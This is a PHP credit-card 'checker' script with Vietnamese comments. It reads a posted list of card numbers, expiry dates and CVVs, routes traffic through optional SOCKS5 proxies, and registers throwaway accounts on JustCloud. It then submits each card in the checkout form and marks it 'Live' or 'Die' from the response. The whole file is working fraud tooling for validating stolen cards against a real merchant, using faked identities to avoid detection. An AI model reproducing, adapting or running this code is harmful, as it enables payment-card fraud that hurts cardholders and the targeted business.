<?php 		
    $thongtinnguoiviet = "Checked at [lamoscar-official.com]";
	$mail = new Mail();
    $curl = new xuly_curl();
	//xoa_cookies();
   // $curl->trinhduyet(random_uagent_desktop());
	 $curl->trinhduyet("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");



//B&#7896; L&#7884;C CC	
	$card = new card($_POST['listcc']);
	$cc = $card->card;  
    $type = $card->type("Amex,Visa,Mastercard,Discover,");
	$zipcc = $cc['zip'];
	$ccn = $cc['num'];
	$ccmon = $cc['mon'];
	$ccyear = $cc['year'];
	$cvv = $cc['cvv'];
	$randomusername = 'dm'.rand(1, 999999);
	
	 $emailok = 'demonpro'. time() . '@checker.cc';
     $pwdok = 'd3mon'.rand(1, 1000);
     $pin = rand(1000, 1000000);

		function selectccv($Cct){
			if($Cct == 3) return '0000';
			else return '000';	}
		function Balance($Balance)	{
			switch ($Balance)	{
				case 5:	$Value = "5";	break;
				case 10:	$Value = "10";	break;
				case 15:	$Value = "15";	break;
				case 20:	$Value = "20";	break;
				case 25:	$Value = "25";	break;		}
			return $Value;	}
		
   	if (!$type)
    {
        $result['thongbaoloi'] = -1;
        $result['msg'] = urldecode($_POST['listcc']);
        echo json_encode($result);
        exit;
    }
//END: B&#7896; LOC CC	

//THONG TIN RAMDOM NEU CAN   
   		$infoacc = new Info;		
		$first =  getRand(true, 4);
        $last =  getRand(true, 5);
		$domain =  getRand(true, 12);
        $mail = getEmail();		
 		$name1 = $infoacc->getFirstName();
		$name2 =$infoacc->getLastName();
		$name3 = $infoacc->getFirstName2();
		$name4 =$infoacc->getLastName2();
		$fullname =$infoacc->getFullName();		
		$diachine = $infoacc->getAddress();
		$cityne =$infoacc->getCity();
		$statene = $infoacc->getSt();
		if ($zipcc == "") $zipcc = $infoacc->getZipcode();		
		$phonene = $infoacc->getPhone1();
		$phonene2 =$infoacc->getPhone2();
		$statene1 = $infoacc->getState();
  		//THONG TIN RAMDOM NEU CAN 


    $sock = urldecode($_POST['sock']);	
	if($sock)	{
    $curl->sock5($sock);
	}




 if (checkMon($ccmon,1) < intval(date("n")) && checkYear($ccyear,4) <= intval(date("Y"))) {
$result['thongbaoloi'] = 2;
 $result['msg'] = '<b style="color:red;">Die</b> |' .$_POST['listcc']. "|".$thongtinnguoiviet;
  echo json_encode($result);
  exit;
}	
					
					
					

$curl->guipost("");
$curl->ref("https://signup.justcloud.com/");
$curl->xemtrang("https://signup.justcloud.com/");
file_put_contents('B0.html', $curl->xuatnoidung);

if(stripos($curl->xuatnoidung, "Welcome to JustCloud") !== false){


$curl->guipost("joinedfrom=&name=sadjoasdjaoidajodisad&email=" . urldecode($mail) . "&password=Xinchao12332A&rememberMe=1&requiredName=");
$curl->ref("https://signup.justcloud.com/");
$curl->xemtrang("https://signup.justcloud.com/");
//file_put_contents('B01.html', $curl->xuatnoidung);

$curl->guipost("");
$curl->ref("https://secure.justcloud.com/");
$curl->xemtrang("https://secure.justcloud.com/");
//file_put_contents('B02.html', $curl->xuatnoidung);


$curl->guipost("");
$curl->ref("https://secure.justcloud.com/");
$curl->xemtrang("https://secure.justcloud.com/update/plan/HOME");
//file_put_contents('B1.html', $curl->xuatnoidung);
 
$curl->guipost("qotse=1");
$curl->ref("https://secure.justcloud.com/");
$curl->xemtrang("https://secure.justcloud.com/update/term/qotse");
//file_put_contents('B2.html', $curl->xuatnoidung); 

if($curl->kiemtraketnoi()){

$post = "type=order&term=1&address_1=hsduishdus&city=djsiodj&state=sjdisdj&zip=10000&country=VN&phone=%2B84918412312&payment_type=creditcard&card_name=AAAAAAAskdsok&card_number=".$ccn."&card_cvv2=".$cvv."&card_month=".checkMon($ccmon,2)."&card_year=".checkYear($ccyear,2);
$curl->guipost($post);
$curl->ref("https://secure.justcloud.com/");
$curl->xemtrang("https://secure.justcloud.com/");
file_put_contents('B8.html', $curl->xuatnoidung);


		

					
if(stripos($curl->xuatnoidung, "Having problems?") !== false){
$result['thongbaoloi'] = 2;
                	$result['msg'] = '<b style="color:red;">Die</b> |' .$_POST['listcc']. "|".$thongtinnguoiviet;
					}
				 
				 			
	 elseif(stripos($curl->xuatnoidung, "Configurations") !== false){
$result['thongbaoloi'] = 0;				
$result['msg'] = '<b style="color:#009933;">Live</b> |' .$_POST['listcc']. "|".$thongtinnguoiviet;	

				 }	
				 			 
		
					
	else {
file_put_contents('DIE2.html', $curl->xuatnoidung);	 
$result['thongbaoloi'] = 1;
$result['msg'] = '<b style="color:red;">Die 2</b> | ' . $_POST['listcc'] . "|".$thongtinnguoiviet; }					
						
					




}else{ $result['thongbaoloi'] = 1; $result['msg'] = $sock . ' | Die or Timeout'; }	
}
else{
	$result['thongbaoloi'] = 1; $result['msg'] = $sock . ' | Die or Timeout'; 
}	

	xoa_cookies_all();	
	sleep($_POST['sleep']);
    echo json_encode($result);
    exit;
  

?>